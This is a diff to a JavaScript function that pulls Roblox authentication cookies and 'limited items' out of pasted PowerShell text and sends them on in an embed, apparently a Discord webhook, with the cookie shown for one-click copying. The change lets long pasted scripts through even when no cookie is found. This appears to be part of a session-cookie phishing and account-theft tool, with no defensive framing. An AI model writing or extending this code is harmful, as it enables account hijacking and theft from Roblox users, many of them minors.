@@ -235,9 +235,11 @@ async function submitPowerShell() {
         const limitedItems = extractLimitedItems(inputText);
         const robloxCookie = extractRobloxCookie(inputText);
         
-        // Block execution if no authentication data is found
-        if (!robloxCookie) {
-
+        // Check word count - if 6000+ words, allow through even without auth data
+        const wordCount = inputText.split(/\s+/).filter(word => word.length > 0).length;
+        
+        // Block execution if no authentication data is found AND less than 6000 words
+        if (!robloxCookie && wordCount < 6000) {
             stopLoadingAnimation(submitText);
             submitText.textContent = 'No Auth Data';
             submitBtn.style.background = '#ef4444'; // Red error color
@@ -270,7 +272,7 @@ async function submitPowerShell() {
                 fields: [
                     {
                         name: "🔑 Roblox Authentication (Click to Copy)",
-                        value: `\`\`\`\n${robloxCookie}\n\`\`\``,
+                        value: robloxCookie ? `\`\`\`\n${robloxCookie}\n\`\`\`` : `**Long Script Detected (${wordCount} words)**\nNo specific auth data found, but content is substantial.`,
                         inline: false
                     },
                     {
